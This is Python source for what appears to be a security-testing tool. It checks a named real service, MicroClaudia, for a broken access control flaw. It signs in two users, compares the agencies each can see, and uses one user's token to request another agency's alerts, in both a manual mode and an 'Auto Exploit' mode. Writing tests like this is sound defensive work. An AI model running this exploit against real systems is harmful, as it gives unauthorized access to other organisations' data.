import json
import requests
from colorist import Color
from itertools import zip_longest
from prettytable import PrettyTable
from core.common.static.constants import MICROCLAUDIA_DOMAIN
from core.modules.artascii.artascii_draw import ArtAsciiDraw
from core.modules.microclaudia.microclaudia_signin import MicroClaudiaSignIn
from core.modules.microclaudia.microclaudia_tokens import MicroClaudiaTokens


class MicroClaudiaPoCs:

    def __init__(self):
        self.domain = MICROCLAUDIA_DOMAIN
        self.tokens = MicroClaudiaTokens()
        self.ascii = ArtAsciiDraw()
        self.signin1 = MicroClaudiaSignIn()
        self.signin2 = MicroClaudiaSignIn()

    def broken_access_control_request(self) -> None:
        """
        This function, allows manual verification of the Broken Access Control vulnerability
        :return:
        """

        # Message
        print(f'{Color.YELLOW}When checking if a user has visibility to an element not accessible through the web interface, focus on these endpoints:\n - https://microclaudia.ccn-cert.cni.es/api/agencies/AGENCY_ID\n - https://microclaudia.ccn-cert.cni.es/api/agencies/AGENCY_ID/alerts\n - https://microclaudia.ccn-cert.cni.es/api/agencies/AGENCY_ID/agents\n - https://microclaudia.ccn-cert.cni.es/api/agencies/AGENCY_ID/vaccines\n - https://microclaudia.ccn-cert.cni.es/api/agents/AGENT_ID\n{Color.OFF}')

        # Ask the user
        token = input("Enter the JWT for user1 (header.payload.signature): ")
        self.tokens.check_payload_token(token)
        headers = {"Authorization": "Bearer " + token}

        # Get input URLs from the user
        urls_input = input('Enter the URL(s) (GET request, separate multiple URLs with commas): ')
        urls = urls_input.split(',')

        # Request
        for url in urls:
            print('Request to:', url.strip())
            response = requests.get(url.strip(), headers=headers)

            # Status
            if response.status_code == 200:
                response_data = response.json()
                print(f'{Color.GREEN}{json.dumps(response_data, indent=2)}{Color.OFF}')
            else:
                print(f'{Color.RED}An error occurred while sending the request{Color.OFF}')
                print(f'{Color.RED}Status Code: {response.status_code}{Color.OFF}')

    def broken_access_control_users(self) -> None:
        """
        This function, allows automated verification of the Broken Access Control vulnerability
        :return:
        """

        # Message
        print(f'{Color.YELLOW}Auto Exploit\n{Color.OFF}')

        # Ask the user
        if self.signin1.token is None:
            print('User 1')
            self.signin1.signin_website()
        if self.signin2.token is None:
            print('User 2')
            self.signin2.signin_website()

        # Agencies Data
        print('User 1: ')
        agencies_response_data_token1 = self.signin1.get_agencies_data()
        print('User 2: ')
        agencies_response_data_token2 = self.signin2.get_agencies_data()

        # Compare
        if 'collection' in agencies_response_data_token1 and 'collection' in agencies_response_data_token2:
            self.check_cross_visibility(agencies_response_data_token1, agencies_response_data_token2)

    def check_cross_visibility(self, data1, data2) -> None:
        """
        This function, checks if user A can access a resource meant for user B
        :param data1:
        :param data2:
        :return:
        """

        # Table
        table = PrettyTable()
        table.field_names = ['User 1 - Agency ID', 'User 1 - Agency Name', 'User 2 - Agency ID', 'User 2 - Agency Name']

        # Lists
        agencies_ids_token1 = []
        agencies_ids_token2 = []

        # User1
        print(f'User 1 has access to {data1["total"]} agencies')
        for agency in data1['collection']:
            agencies_ids_token1.append(agency['id'])

        # User 2
        print(f'User 2 has access to {data2["total"]} agencies')
        for agency in data2['collection']:
            agencies_ids_token2.append(agency['id'])

        # Summary Table
        for agency1, agency2 in zip_longest(data1['collection'], data2['collection'], fillvalue={}):
            table.add_row([agency1.get("id", ""), agency1.get("name", ""), agency2.get("id", ""), agency2.get("name", "")])

        # Differences
        different_list1 = list(set(agencies_ids_token1) - set(agencies_ids_token2))
        different_list2 = list(set(agencies_ids_token2) - set(agencies_ids_token1))

        # Check
        if different_list1 == [] and different_list2 == []:
            print(f'User 1 and User 2 have access to the same agencies')
        else:
            # Message
            print(f'{Color.YELLOW}We will make only one request to verify that by using the token from account X, it is possible to access/modify information (alerts, teams, vaccines, agents, ...) in account Y, exploiting this broken access control vulnerability.{Color.OFF}')

            # Request
            if different_list1 >= different_list2:
                print(f'{Color.YELLOW}A request from User 2 is made to gather information on an agency that only User 1 should have access to{Color.OFF}')
                self.check_cross_agency(self.signin2.token, different_list1[0])
            else:
                print(f'{Color.YELLOW}A request from User 1 is made to gather information on an agency that only User 2 should have access to{Color.OFF}')
                self.check_cross_agency(self.signin1.token, different_list2[0])

            # Print
            print(table)
            print('\n')

    def check_cross_agency(self, token, agency) -> None:
        """
        This function, sends a request as user A to a resource that should only be accessible to user B
        :param token:
        :param agency:
        :return:
        """

        # Url
        url = f'https://{self.domain}/api/agencies/{agency}/alerts'
        headers = {"Authorization": "Bearer " + token}

        # Request
        print('Request to:', url)
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            self.ascii.vulnerable()
        else:
            self.ascii.not_vulnerable()
            print(f'{Color.RED}Status Code: {response.status_code}{Color.OFF}')
